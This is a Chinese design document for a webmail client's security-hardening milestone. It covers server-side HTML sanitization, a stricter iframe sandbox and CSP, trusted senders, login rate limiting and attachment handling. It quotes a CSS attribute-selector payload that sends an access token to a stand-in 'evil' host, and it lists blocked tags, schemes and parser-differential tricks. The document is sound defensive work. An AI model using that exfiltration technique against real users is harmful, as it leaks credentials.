# M12 阅读隐私与安全加固

> 状态：开发中（2026-09-07）
> 路线图条目：[`roadmap.md`](roadmap.md) M12

## 现状（M10 之后）

正文渲染已抽到 `MessageBody.tsx`：前端用正则把 `<img src>` 换成 `data-blocked-src`、删远程 `<link>`，
再往 iframe 文档头部注入 CSP（默认 `img-src 'self' data:`、`script-src 'none'`）兜底。
两个缺口：

1. 净化完全在前端且基于正则——`<script>`、事件处理器、`<iframe>`、`<object>` 只靠 sandbox 与 CSP 挡；
   CSS `url()` / `@import` / `background=` 属性靠 CSP 挡，HTML 本身没剥。
2. iframe `sandbox="allow-same-origin allow-popups"`：父窗口为了量高度与拦截链接拿到了同源权限，
   一旦邮件内容找到任何执行途径（浏览器缺陷、CSP 失效），就是父窗口的完整权限。

## 目标

默认不发起任何由邮件内容触发的外部请求；净化在服务端完成，前端 CSP 与沙箱只是纵深防御；
iframe 不再同源。

## 服务端 HTML 净化

`internal/htmlsan`，两遍：

1. **预处理**（`golang.org/x/net/html` tokenizer）：
   - 整块丢弃 `script` / `iframe` / `object` / `embed` / `applet` / `noscript` / `link` / `meta` / `base` / `form` / `input` / `button` / `textarea` / `select`；
   - `<style>` 块取出来单独做 CSS 净化后追加回输出头部（bluemonday 会整块丢掉 `<style>`，而邮件模板离不开它）；
   - 所有 `on*` 事件属性、`javascript:` / `vbscript:` / `data:text/html` URL 丢弃；
   - 远程资源引用（`img/source/video/audio/track` 的 `src` / `srcset` / `poster`，`table/td/body` 的 `background`，
     `style` 属性与 `<style>` 里的 `url()`、`@import`）：计数进 `remote_count`；不允许远程时 `src` 换成 1×1 透明 gif、
     `srcset` / `poster` / `background` 删除、CSS 里的 `url(远程)` 换成 `none`；`cid:` 与 `data:image/*` 不算远程。
   - CSS 文本统一剥 `@import`、`expression(`、`behavior:`、`-moz-binding`。
2. **bluemonday** 白名单收尾：邮件常见的排版标签，全局允许 `style`（预处理已净化 CSS）/ `class` / `id` / 对齐尺寸颜色类属性，
   `a` 允许 `href`（http / https / mailto / tel）并强制 `target=_blank rel=noopener noreferrer`，
   `img` 允许 `src`（http / https / cid / data:image）与 `alt` / `width` / `height`。

`Sanitize(html, allowRemote) → { HTML, RemoteCount }`。纯文本正文不经过净化。

## 详情接口

```
GET /messages/:id            → MessageDetail + { remote_count: number, remote_allowed: boolean }
GET /messages/:id?remote=1   → 同上，但保留远程引用（用户点了「显示图片」）
```

`remote_allowed` 为真的两种情况：请求带 `remote=1`，或发件人在信任名单里；此时 `html_body` 保留远程引用。
否则 `html_body` 已把远程引用换成占位符。`html_body` 无论如何都是净化过的。

响应另带 `attachment_token`：限定这一封、1 小时时效的 JWT，附件端点的查询参数**只接受**它。
前端拼 cid 内联图与附件链接必须用它——这些 URL 会写进邮件 HTML 所在的 iframe 文档，那是攻击者可控的内容；
带完整 access token 的话，开启远程内容后可用 CSS 属性选择器（`img[src^="…access_token=eyJ…"]{background:url(https://evil/1)}`）
逐字符外泄，不需要执行脚本（前端安全审查发现，M10 遗留）。泄露附件令牌的代价被压到「拿到本就在看的这封邮件的附件」。

> **2026-09-10 更新（KI-2 收尾）**：上面这条「同时接受两种令牌」已经改掉——查询参数改名为 `?ticket=`
> 且**只接受 attachment 类型令牌**，access token 只能走 `Authorization: Bearer`（用户主动下载的
> axios blob 路径）。`VerifyAttachmentAccess` 新增 `fromQuery` 参数，为真时 access token 直接拒；
> query 的优先级高于请求头，所以同时带两者也不会降级。
> 原因：旧前端 `attachmentUrl` 有 `opts?.token || auth.access` 的兜底，详情接口没带 attachment_token 时
> 完整 access token 会落进那份由发件人控制的文档——上面描述的攻击链当时是通的，不只是理论。
> SSE 端点另走一次性票据（`POST /events/ticket`，60s TTL，握手时核销），详见 `known-issues.md` KI-2。

## 发件人信任名单

```
GET    /privacy/trusted-senders            → { senders: [{ id, address, created_at }] }
POST   /privacy/trusted-senders {address}  → 201 TrustedSender；重复 409；非法 400
DELETE /privacy/trusted-senders/:id
```

地址归一化为小写；只按精确地址（不做域名），因为「总是显示此发件人的图片」是对一个人的信任。

**已知限制**：信任建立在未经验证的 `From` 头上——本项目没有 DKIM / SPF / DMARC 校验，伪造 `From` 就能让远程图片
对该邮件自动放行。主流客户端也是同样取舍；后续可考虑「DKIM 通过才应用信任」。同形域名（西里尔字母）不做归一。

## iframe 沙箱

- `sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"`，**不再有 `allow-same-origin`**：
  iframe 是不透明源，父窗口拿不到它的文档，它也拿不到父窗口。
- 高度：文档里注入一段带 CSP nonce 的内联脚本，`load` 与 `ResizeObserver(document.documentElement)` 时
  `parent.postMessage({ type: 'fm:height', token, height }, '*')`；父窗口校验 `event.source === iframe.contentWindow`
  且 `token` 匹配后设置高度。
- 链接：`<base target="_blank">` + `allow-popups-to-escape-sandbox` 让外链在新标签打开；`mailto:` 由注入脚本拦截
  并 `postMessage({ type: 'fm:mailto', token, href })` 交给父窗口打开撰写器。
- CSP：`script-src 'nonce-<随机>'`（只放行我们注入的脚本；邮件里的脚本已在服务端剥掉，这里是第二道）、
  `default-src 'none'`、`img-src 'self' data: blob:`（允许远程时加 `https: http:`）、`style-src 'unsafe-inline'`、
  `connect-src 'none'`、`frame-src 'none'`、`form-action 'none'`。
- **代码注释里写明：任何情况下不得同时开启 `allow-same-origin` 与 `allow-scripts`**——那等于把沙箱拆掉。
- 引用折叠仍由父窗口生成 srcDoc 时注入隐藏样式，不依赖同源。

## 登录限流

- `login_attempts(ip 主键, failures, window_start)` 落 SQLite，重启不清零；封禁态由「窗口内 failures ≥ 10」推导，不单独存列。
- 失败计数是**单条原子 upsert**（窗口过期从 1 重计，否则 +1）：读-改-写在并发下会互相覆盖，
  审查实测 40 个并发只记到 1 次，攻击者十来个连接就能让限流永远不触发。并发单测守着。
- 15 分钟窗口内失败 10 次 → 之后的请求直接 429，`Retry-After` 头 + `{ error, retry_after: 秒 }`，结构化日志 `auth: 登录限流`
  （日志不记用户名：用户常把密码敲进用户名框）。
- 登录成功清零该 IP；窗口过期自动重置。
- **IP 来源**：gin 默认信任所有代理并读 `X-Forwarded-For`，任何直连客户端都能伪造 IP 绕过限流或把别人锁在门外。
  现在默认 `SetTrustedProxies(nil)`（只取 TCP 对端），挂反向代理时在 `server.trusted_proxies` 里填代理地址 / CIDR。
- 窗口 / 阈值为包内常量（15 分钟 / 10 次），不做配置项。
- 未做：`/auth/refresh` 不限流（refresh token 是签名 JWT，爆破不现实）；没有按账号维度的计数；达到阈值前没有 per-IP 并发闸门。

## 附件端点（顺带修的既有高危洞）

`GET /messages/:id/attachments/:idx` 原来按邮件自带的 Content-Type 以 `inline` 同源返回：一封带 `text/html` 附件的邮件，
用户点预览就是在应用 origin 上执行任意脚本（能直接读走 localStorage 里的 token）。现在：
只有图片（svg 除外）/ PDF / 纯文本 / 音视频允许 inline，其余一律 `application/octet-stream` + `attachment`；
补 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`。

## 前端

- `MessageBody.tsx`：删掉正则拦截，改用详情的 `remote_count` / `remote_allowed`；「显示图片」= 带 `remote=1` 重新取详情；
  「总是显示此发件人的图片」= POST 信任名单后重取；CSP 保留为纵深防御；iframe 改造如上。
- 设置 → 隐私：信任名单管理（列表 / 删除）；现有「默认显示远程图片」开关保留（开着时相当于全部信任：请求都带 `remote=1`）。
- 登录页：429 时按 `retry_after` 显示「尝试次数过多，请 N 分钟后再试」并禁用按钮到期。

## 净化器的边界（安全审查后补充）

- CSS 先做转义还原（`\75 rl(` 是 `url(`），`image-set()` 与 `url()` 同等处理；srcset 逐个候选检查；
  URL 判定统一走「去控制字符、`\`→`/`、小写」的归一化，`isRemote` 与 `isDangerousURL` 不再有口径缝隙。
- 空 `<style></style>` 与自闭合 `<style/>`、`<script/>`：tokenizer 的原始文本模式与浏览器一致，
  实现按同样语义处理（空样式块不能把后面正文当样式吞掉——审查时找到的严重缺陷）。
- `plaintext` / `xmp` / `listing` / `noembed` / `noframes` 整块丢弃；邮件自带的 `rel` / `target` 丢弃，由 bluemonday 统一补。
- `<style>` 块是唯一不经 bluemonday 白名单的输出通道：其内容来自 tokenizer 的原始文本，因而不含 `</style`，
  代码里以不变量注释标明。
- `remote_count` 是「大致数量」：同一张图的 `src` + `srcset` 计两次，被丢弃元素里的引用不计；前端只用它判断是否显示横幅。
- 输入超过 2 MB 截断；无缓存，每次打开邮件重算（13k 字节的营销邮件毫秒级）。
- 审查用解析差异类攻击（属性名注入、bogus comment、CDATA、条件注释、实体编码的 `javascript:`、`data:text/html`）逐一探测，均被挡住。
